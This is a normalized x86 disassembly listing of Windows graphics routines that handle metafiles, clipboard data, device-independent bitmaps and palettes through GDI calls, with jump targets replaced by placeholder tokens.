sub_428760
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026cc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4287dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41b25c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026ec
retn
sub_4287ec
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402cbc
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_41b25c
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41b25c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42890e
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026ec
retn
call sub_4258c0
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_4266b0
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_428927
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4026cc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428907
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_428934
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_4280d4
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_425830
sub_4289b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_428a88
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418cd4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_428b26
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428b2d
mov eax [ rw-data ]
call sub_418d38
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_428afe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_428c18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425444
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4188d4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4253e8
test al al
je r-xdata
sub_428b34
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418cd4
mov esi eax
xor ecx ecx
push ebp
push sub_428ba4
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418d38
retn
mov edx ebx
mov eax esi
call sub_4188d4
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_428c18
sub_428bb0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_424e50
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_428bec
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_428c18
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424f14
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_428c18
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_425154
xor edx edx
push ebp
push sub_428cac
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4255f0
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_418ce8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425444
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_428cb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_425154
xor eax eax
push ebp
push sub_428d97
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42a0c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_428b34
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42a1c0
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4255f0
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_418c4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425444
retn
sub_428da8
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_4032a8
sub_428dc8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_428b34
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d4f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_428e24
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_423714
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_428b34
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_428b34
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_428e70
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_4260fc
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_428f1f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_428f2c
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_428f78
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_428b34
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_425968
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_425968
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_4295c6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026cc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_4292d0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_425848
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_425968
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_425968
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_425968
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_425968
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_429577
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_429566
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_429544
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_425968
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_428f2c
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_4260fc
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424ca4
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_417298
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423fe4
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424c68
call sub_423fe4
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4258c0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42954b
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_425968
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_42951a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_425968
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026ec
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423fe4
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424c68
call sub_423fe4
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423fe4
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424c68
call sub_423fe4
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_425968
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403b20
call sub_403b20
jmp r-xdata
sub_42956d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_42957c
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403a9c
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_4295dc
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_429640
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_428b34
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42983b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_425968
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_425968
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_425968
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4297f3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_428f78
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
